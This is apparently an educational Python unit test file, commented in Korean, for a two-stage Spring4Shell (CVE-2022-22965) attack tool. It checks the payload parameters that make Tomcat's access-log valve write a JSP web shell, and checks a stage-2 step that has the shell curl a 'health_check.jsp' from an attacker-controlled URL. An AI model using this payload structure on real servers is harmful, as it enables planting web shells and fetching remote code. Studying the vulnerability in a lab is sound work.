"""
test_attack_scripts.py
CVE-2022-22965 (Spring4Shell) — AttackScripts 유닛 테스트
Educational Use Only

[설계 원칙]
- SRP  : 각 테스트 클래스는 단 하나의 컴포넌트만 검증합니다.
- OCP  : Mock 어댑터로 외부 의존성을 교체하여 코드 변경 없이 테스트를 확장할 수 있습니다.
- LSP  : MockFileServer, MockExecutor는 각각 FileServerPort, Stage1CommandPort를 완전히 대체합니다.
- ISP  : 각 포트 인터페이스(FileServerPort / Stage1CommandPort)는 최소 메서드만 선언합니다.
- DIP  : Stage2UploadUseCase는 구체 클래스 대신 포트(인터페이스)에 의존합니다.

[Clean Architecture 계층]
  Entities  : ExploitConfig, UploadConfig
  Use Cases : Stage2UploadUseCase
  Interface : Spring4ShellPayloadGenerator, ExploitController
  Framework : LocalFileServerAdapter, Stage1CommandAdapter (실제 네트워크 의존 — Mocking 대상)
"""

import sys
import os
import unittest
from unittest.mock import MagicMock, patch, call

# ── 경로 설정 ──────────────────────────────────────────────────
PROJECT_ROOT = os.path.dirname(os.path.abspath(__file__))
SCRIPTS_DIR  = os.path.join(PROJECT_ROOT, "02.AttackScripts")
sys.path.insert(0, SCRIPTS_DIR)

# ── 모듈 임포트 ────────────────────────────────────────────────
from stage1_dropper import (
    ExploitConfig,
    Spring4ShellPayloadGenerator,
    ExploitController,
    PayloadGeneratorPort,
)
from stage2_uploader import (
    UploadConfig,
    FileServerPort,
    Stage1CommandPort,
    Stage2UploadUseCase,
)


# ==============================================================
# [Domain / Entity] ExploitConfig 테스트
# ==============================================================
class TestExploitConfig(unittest.TestCase):
    """
    SRP: ExploitConfig는 Stage1 설정값 보관 단일 책임만 집니다.
    이 클래스는 기본값 설정과 속성 저장만 검증합니다.
    """

    def test_default_values_are_set_correctly(self):
        """기본값이 올바르게 설정되는지 검증"""
        config = ExploitConfig(target_url="http://localhost:8011/spring-form/login")
        self.assertEqual(config.output_dir, "webapps/ROOT")
        self.assertEqual(config.filename, "yaho4")

    def test_custom_values_override_defaults(self):
        """사용자 정의 값으로 기본값이 정상 덮어씌워지는지 검증"""
        config = ExploitConfig(
            target_url="http://target.example.com/login",
            output_dir="custom/dir",
            filename="custom_shell",
        )
        self.assertEqual(config.output_dir, "custom/dir")
        self.assertEqual(config.filename, "custom_shell")


# ==============================================================
# [Interface Adapter] Spring4ShellPayloadGenerator 테스트
# ==============================================================
class TestSpring4ShellPayloadGenerator(unittest.TestCase):
    """
    OCP / LSP: Spring4ShellPayloadGenerator는 PayloadGeneratorPort 인터페이스를 구현합니다.
    내부 구현 세부사항 변경 없이, 출력 계약(payload 형식)만 검증합니다.
    """

    def setUp(self):
        self.config    = ExploitConfig(target_url="http://localhost/login")
        self.generator = Spring4ShellPayloadGenerator(self.config)

    def test_implements_port_interface(self):
        """PayloadGeneratorPort의 LSP 준수 여부 — 인터페이스 완전 구현 확인"""
        self.assertIsInstance(self.generator, PayloadGeneratorPort)

    def test_headers_contain_required_fields(self):
        """Spring4Shell 공격에 필수적인 헤더 키가 포함되어 있는지 검증"""
        headers = self.generator.generate_headers()
        self.assertIn("prefix", headers)
        self.assertIn("suffix", headers)
        self.assertIn("c", headers)

    def test_headers_target_java_runtime(self):
        """페이로드가 java.lang.Runtime을 타겟으로 하는지 검증"""
        headers = self.generator.generate_headers()
        self.assertEqual(headers["c"], "java.lang.Runtime")

    def test_body_contains_spring_binding_keys(self):
        """CVE-2022-22965의 핵심 — Data Binding 취약 파라미터 키가 포함되는지 검증"""
        body = self.generator.generate_body()
        pipeline_key = "class.module.classLoader.resources.context.parent.pipeline.first"
        self.assertTrue(
            any(pipeline_key in k for k in body.keys()),
            "Spring4Shell AccessLogValve 조작 파라미터가 payload body에 존재해야 합니다."
        )

    def test_body_uses_config_filename(self):
        """생성된 페이로드가 config의 filename 값을 올바르게 사용하는지 검증"""
        body = self.generator.generate_body()
        prefix_key = "class.module.classLoader.resources.context.parent.pipeline.first.prefix"
        self.assertEqual(body[prefix_key], self.config.filename)

    def test_body_uses_config_output_dir(self):
        """생성된 페이로드가 config의 output_dir 값을 올바르게 사용하는지 검증"""
        body = self.generator.generate_body()
        dir_key = "class.module.classLoader.resources.context.parent.pipeline.first.directory"
        self.assertEqual(body[dir_key], self.config.output_dir)


# ==============================================================
# [Use Case] ExploitController — HTTP 레이어 Mock 격리 테스트
# ==============================================================
class TestExploitController(unittest.TestCase):
    """
    DIP: ExploitController는 PayloadGeneratorPort에 의존합니다.
    HTTP 통신은 Mock으로 격리하여 비즈니스 로직만 검증합니다.
    """

    def setUp(self):
        self.mock_generator = MagicMock(spec=PayloadGeneratorPort)
        self.mock_generator.generate_headers.return_value = {
            "prefix": "<%", "suffix": "%>//", "c": "java.lang.Runtime",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        self.mock_generator.generate_body.return_value = {
            "class.module.classLoader.resources.context.parent.pipeline.first.prefix": "yaho4",
            "class.module.classLoader.resources.context.parent.pipeline.first.suffix": ".jsp",
            "class.module.classLoader.resources.context.parent.pipeline.first.directory": "webapps/ROOT",
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern": "<% test %>",
            "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat": "",
        }
        self.controller = ExploitController(self.mock_generator)

    @patch("urllib.request.urlopen")
    def test_run_exploit_returns_true_on_http_200(self, mock_urlopen):
        """HTTP 200 응답 시 exploit이 성공을 반환하는지 검증"""
        mock_response = MagicMock()
        mock_response.status = 200
        mock_urlopen.return_value = mock_response

        result = self.controller.run_exploit("http://localhost/login")
        self.assertTrue(result)

    @patch("urllib.request.urlopen")
    def test_run_exploit_calls_generator_methods(self, mock_urlopen):
        """exploit 실행 시 generator의 헤더와 바디가 모두 사용되는지 검증"""
        mock_response = MagicMock()
        mock_response.status = 200
        mock_urlopen.return_value = mock_response

        self.controller.run_exploit("http://localhost/login")
        self.mock_generator.generate_headers.assert_called_once()
        self.mock_generator.generate_body.assert_called_once()

    @patch("urllib.request.urlopen")
    def test_run_exploit_handles_http_error_gracefully(self, mock_urlopen):
        """HTTP 에러(404, 500 등) 응답 시에도 폭발하지 않고 True를 반환하는지 검증
        (취약 서버는 가끔 에러 코드로 응답해도 payload가 처리될 수 있음)
        """
        import urllib.error
        http_err = urllib.error.HTTPError(
            url="http://localhost/login", code=400,
            msg="Bad Request", hdrs=None, fp=None
        )
        mock_urlopen.side_effect = http_err

        result = self.controller.run_exploit("http://localhost/login")
        self.assertTrue(result, "HTTP 에러 코드여도 payload가 전달됐으므로 True를 반환해야 합니다.")

    @patch("urllib.request.urlopen")
    def test_run_exploit_returns_false_on_connection_error(self, mock_urlopen):
        """네트워크 연결 자체 실패 시 False를 반환하는지 검증"""
        import urllib.error
        mock_urlopen.side_effect = urllib.error.URLError(reason="Connection refused")
        result = self.controller.run_exploit("http://localhost/login")
        self.assertFalse(result)


# ==============================================================
# [Domain / Entity] UploadConfig 테스트
# ==============================================================
class TestUploadConfig(unittest.TestCase):
    """
    SRP: UploadConfig는 Stage2 배포 설정값 보관만 담당합니다.
    """

    def test_default_attacker_url_uses_docker_internal(self):
        """attacker_url 미입력 시 host.docker.internal로 자동 설정되는지 검증"""
        config = UploadConfig(local_serve_port=9090)
        self.assertIn("host.docker.internal", config.attacker_url)
        self.assertIn("9090", config.attacker_url)

    def test_custom_attacker_url_is_respected(self):
        """명시적 attacker_url이 그대로 사용되는지 검증"""
        custom_url = "http://123.456.789.0:9090"
        config = UploadConfig(attacker_url=custom_url)
        self.assertTrue(config.attacker_url.startswith("http://123.456.789.0"))

    def test_trailing_slash_is_stripped_from_attacker_url(self):
        """attacker_url의 끝 슬래시가 제거되는지 검증 (URL 이중 슬래시 방지)"""
        config = UploadConfig(attacker_url="http://example.com/")
        self.assertFalse(config.attacker_url.endswith("/"))

    def test_stage2_file_default(self):
        """기본 Stage2 파일명이 health_check.jsp인지 검증"""
        config = UploadConfig()
        self.assertEqual(config.stage2_file, "health_check.jsp")


# ==============================================================
# [Use Case] Stage2UploadUseCase — 포트 Mock 격리 테스트
# ==============================================================
class TestStage2UploadUseCase(unittest.TestCase):
    """
    DIP / ISP: Stage2UploadUseCase는 FileServerPort, Stage1CommandPort에만 의존합니다.
    실제 네트워크/파일시스템을 사용하지 않고 Mock으로 100% 격리 검증합니다.
    """

    def _build_mock_executor(self, ls_output="health_check.jsp found"):
        """테스트용 Mock Stage1CommandPort — OCP: 외부 코드 변경 없이 동작 교체"""
        mock_executor = MagicMock(spec=Stage1CommandPort)
        mock_executor.execute.return_value = ls_output
        return mock_executor

    def _build_mock_file_server(self):
        """테스트용 Mock FileServerPort — LSP: 실제 어댑터와 완전히 대체 가능"""
        return MagicMock(spec=FileServerPort)

    def setUp(self):
        self.config = UploadConfig(
            stager_url="http://localhost:8011/yaho4.jsp",
            stage2_file="health_check.jsp",
            local_serve_port=9090,
            target_save_dir="/usr/local/tomcat/webapps/ROOT",
        )

    def test_file_server_starts_and_stops_during_run(self):
        """Stage2 배포 실행 시 파일 서버가 시작 후 반드시 종료되는지 검증"""
        mock_file_server = self._build_mock_file_server()
        mock_executor    = self._build_mock_executor()

        use_case = Stage2UploadUseCase(mock_file_server, mock_executor, self.config)
        use_case.run()

        mock_file_server.start.assert_called_once()
        mock_file_server.stop.assert_called_once()

    def test_executor_called_with_correct_download_command(self):
        """Stage 1 쉘에 curl 다운로드 명령이 올바른 URL로 전달되는지 검증"""
        mock_file_server = self._build_mock_file_server()
        mock_executor    = self._build_mock_executor()

        use_case = Stage2UploadUseCase(mock_file_server, mock_executor, self.config)
        use_case.run()

        # execute가 2회 호출됨 (curl + ls)
        self.assertEqual(mock_executor.execute.call_count, 2)

        # 첫 번째 호출은 curl 다운로드 명령
        first_call_cmd = mock_executor.execute.call_args_list[0][0][1]
        self.assertIn("curl", first_call_cmd)
        self.assertIn("health_check.jsp", first_call_cmd)

    def test_executor_called_with_stager_url(self):
        """executor가 올바른 stager_url을 사용하는지 검증"""
        mock_file_server = self._build_mock_file_server()
        mock_executor    = self._build_mock_executor()

        use_case = Stage2UploadUseCase(mock_file_server, mock_executor, self.config)
        use_case.run()

        first_call_stager = mock_executor.execute.call_args_list[0][0][0]
        self.assertEqual(first_call_stager, self.config.stager_url)

    def test_download_url_contains_attacker_url_and_filename(self):
        """다운로드 URL이 attacker_url + stage2_file로 올바르게 구성되는지 검증"""
        mock_file_server = self._build_mock_file_server()
        mock_executor    = self._build_mock_executor()

        use_case = Stage2UploadUseCase(mock_file_server, mock_executor, self.config)
        use_case.run()

        first_call_cmd = mock_executor.execute.call_args_list[0][0][1]
        expected_url = f"{self.config.attacker_url}/{self.config.stage2_file}"
        self.assertIn(expected_url, first_call_cmd)


# ==============================================================
# Entry Point
# ==============================================================
if __name__ == "__main__":
    unittest.main(verbosity=2)
